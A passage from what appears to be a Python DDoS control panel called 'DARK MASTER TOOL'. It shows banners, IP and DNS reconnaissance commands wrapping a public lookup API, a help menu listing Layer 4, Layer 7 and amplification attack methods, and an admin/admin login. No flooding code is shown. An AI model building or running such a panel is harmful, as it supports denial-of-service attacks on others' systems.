            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  \033[0m')
                
        # TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API Error :( ]\033[0m")
            except IndexError:
                print('\033[92mUsage: geoip <ip>\033[0m')
                print('\033[92mExample: geoip 1.1.1.1\033[0m')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API Error :( ]\033[0m")
            except IndexError:
                print('\033[92mUsage: reverseip <ip>\033[0m')
                print('\033[92mExample: reverseip 1.1.1.1\033[0m')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API Error :( ]\033[0m")
            except IndexError:
                print('\033[92mUsage: subnet-lookup <cdr/ip + netmask>\033[0m')
                print('\033[92mExample: subnet-lookup 192.168.1.0/24\033[0m')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API Error :( ]\033[0m")
            except IndexError:
                print('\033[92mUsage: asn-lookup <ip/asn>\033[0m')
                print('\033[92mExample: asn-lookup AS15169\033[0m')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API Error :( ]\033[0m")
            except IndexError:
                print('\033[92mUsage: dns-lookup <dns>\033[0m')
                print('\033[92mExample: dns-lookup google.com\033[0m')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API Error :( ]\033[0m")
            except IndexError:
                print('\033[92mUsage: reverse-dns <ip/domain>\033[0m')
                print('\033[92mExample: reverse-dns 8.8.8.8\033[0m')                

        elif "cloudflare-lag" in cnc:
            print('\033[91mMethod "CLOUDFLARE-LAG" not enabled\033[0m')

        elif "help" in cnc:
            print(f'''
\033[91mLAYER7  \033[92m► SHOW LAYER7 METHODS\033[0m
\033[91mLAYER4  \033[92m► SHOW LAYER4 METHODS\033[0m
\033[91mAMP     \033[92m► SHOW AMP METHODS\033[0m
\033[91mSPECIAL \033[92m► SHOW SPECIAL METHODS\033[0m
\033[91mBANNERS \033[92m► SHOW BANNERS\033[0m
\033[91mRULES   \033[92m► RULES PANEL\033[0m
\033[91mPORTS   \033[92m► SHOW ALL PORTS\033[0m
\033[91mTOOLS   \033[92m► SHOW TOOLS\033[0m
\033[91mCLEAR   \033[92m► CLEAR TERMINAL\033[0m
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print(f"\033[91mCommand: [ {cmmnd} ] Not Found!\033[0m")
            except IndexError:
                pass


def login():
    clear()
    user = "admin"
    passwd = "admin"
    username = input("\033[91m⚡ Username: \033[0m")
    password = getpass.getpass(prompt='\033[91m⚡ Password: \033[0m')
    if username != user or password != passwd:
        print("")
        print("\033[91m⚡ Haizzz, you're so cute...\033[0m")
        sys.exit(1)
    elif username == user and password == passwd:
        print("\033[92m⚡ Welcome to DARK MASTER TOOL\033[0m")
        time.sleep(0.3)
        ascii_vro()
        main()

login()